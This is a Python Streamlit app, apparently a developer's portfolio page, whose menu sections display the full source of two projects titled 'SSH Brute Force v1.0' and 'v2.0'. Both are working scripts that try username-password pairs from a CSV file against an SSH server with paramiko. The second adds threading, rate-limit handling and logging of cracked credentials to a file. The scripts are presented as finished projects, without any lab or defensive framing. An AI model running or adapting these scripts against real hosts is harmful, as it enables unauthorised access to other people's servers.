
import streamlit as st
from streamlit_lottie import st_lottie as stl
import requests
from PIL import Image

########## VARIAVES #########

def load_lottieurl(url):
    r = requests.get(url)
    if r.status_code != 200:
        return None
    return r.json()


Menu = ("Home", "SSH Brute Force v1.0", "SSH Brute Force v2.0", "OpenAi ChatBot v1.0", "Jake The Assistant v1.0", "Jake The Assistant v2.0", "Guruha Studios App v.1.0", "Guruha Studis App v1.2")
Studio_lottie = load_lottieurl('https://lottie.host/50d09cf9-40e9-4100-b670-85d0835e1cb5/TYw6SssE34.json')
image = Image.open('Image.jpg')

########## CODE ###########


st.set_page_config(page_title="Guruha Studios", layout= "wide")

with st.container():
    column1 , column2 = st.columns((1, 2))
    st.sidebar.title("Menu:")
    choice = st.sidebar.selectbox("##",Menu)

    if choice == "Home":
        with column1:
            st.title("Welcome to Guruha Studios!")
            st.write("----")
            st.write("Here at Guruha Studios we develop projects mainly in python and C, but we are also involved in html, Unity, and Java development.")
            st.write("Located in Athens the founder of the Studios and the developer is Filippos Tsoukias.")
            st.image(image, caption='Filippos Tsoukias')


        with column2:
            stl(Studio_lottie, height = 500)

    if choice == "SSH Brute Force v1.0":
        st.title("SSH Brute Force v1.0")
        st.write("----")
        st.write("A python project that uses a csv list file to try and break the password of an ssh client!")
        st.write("###")
        st.code('''import csv
import paramiko

# File path to the CSV file
file_path = 'C:/Users/Filippos Tsoukias/Documents/Coding 2022/Python/SSH Brute Force/passwords.csv'

# Hostname or IP address of the SSH server
hostname = '172.28.68.61'
port = 22

# Open the CSV file
with open(file_path, 'r') as csvfile:
    # Read the CSV file
    reader = csv.reader(csvfile)
    headers = next(reader)  # Skip the first row (headers)

    # Try each row (credentials) in the CSV file
    for row in reader:
        username = row[0]
        password = row[1]
        try:
            # Create an SSH client
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

            # Connect to the SSH server
            client.connect(hostname, port, username, password)
            print(f"Connected to {hostname} as {username}")

            # Close the connection
            client.close()
            break
        except paramiko.ssh_exception.AuthenticationException:
            # Credentials are incorrect, try the next row
            pass

# Could not connect with any of the credentials
print("Could not connect to the SSH server")
''')

    if choice == "SSH Brute Force v2.0":
        st.title("SSH Brute Force v2.0")
        st.write("An upgraded python project that uses a csv list file to try and break the password of an ssh client! Now using threading to make it more efficient!")
        st.write("###")
        st.code('''
import csv
import ipaddress
import threading
import os
import time
import logging
from logging import NullHandler
from paramiko import SSHClient, AutoAddPolicy, AuthenticationException, ssh_exception


# This function is responsible for the ssh client connecting.
def ssh_connect(host, username, password):
    ssh_client = SSHClient()
    # Set the host policies. We add the new hostname and new host key to the local HostKeys object.
    ssh_client.set_missing_host_key_policy(AutoAddPolicy())
    try:
        # We attempt to connect to the host, on port 22 which is ssh, with password, and username that was read from the csv file.
        ssh_client.connect(host,port=22,username=username, password=password, banner_timeout=300)
        # If it didn't throw an exception, we know the credentials were successful, so we write it to a file.
        with open("credentials_found.txt", "w") as fh:
            # We write the credentials that worked to a file.
            print(f"Username - {username} and Password - {password} found.")
            fh.write(f"Username: {username} Password: {password} Worked on host {host} ========NEW========")
            
                    
                
    except AuthenticationException:
        #print(f"Username - {username} and Password - {password} is Incorrect.")
        print("Processing...")
        
    except ssh_exception.SSHException:
        #print("**** Attempting to connect - Rate limiting on server ****")
        print("Rate Limiting")
        

# This function gets a valid IP address from the user. 
def get_ip_address():
    # We create a while loop, that we'll break out of only once we've received a valid IP Address.
    while True:
        host = input("Please enter the host ip address: ")
        try:
            # Check if host is a valid IPv4 address. If so we return host.
            ipaddress.IPv4Address(host)
            return host
        except ipaddress.AddressValueError:
            # If host is not a valid IPv4 address we send the message that the user should enter a valid ip address.
            print("Please enter a valid ip address.")


    
            
        

# The program will start in the main function.
def __main__():
    
    host = get_ip_address()
    
    list = ("C:/Users/Filippos Tsoukias/Documents/Coding 2022/Python/SSH Brute Force/passwords1.csv") # Here put thhe location of passwords1.csv
    
    logging.getLogger('paramiko.transport').addHandler(NullHandler())
    # To keep to functional programming standards we declare ssh_port inside a function.
    
    list_file = list
    # This function reads a csv file with passwords.
    with open(list_file) as fh:
        csv_reader = csv.reader(fh, delimiter=",")
        # We use the enumerate() on the csv_reader object. This allows us to access the index and the data.
        for index, row in enumerate(csv_reader):
            # The 0 index is where the headings are allocated.
            if index == 0:
                continue
            else:
                #  We create a thread on the ssh_connect function, and send the correct arguments to it.
                t = threading.Thread(target=ssh_connect, args=(host, row[0], row[1],))
                # We start the thread.
                t.start()
                # We leave a small time between starting a new connection thread.
                time.sleep(0.2)
                # ssh_connect(host, ssh_port, row[0], row[1])

            

#  We run the main function where execution starts.
__main__()
''')
        
    if choice == "OpenAi ChatBot v1.0":
        pass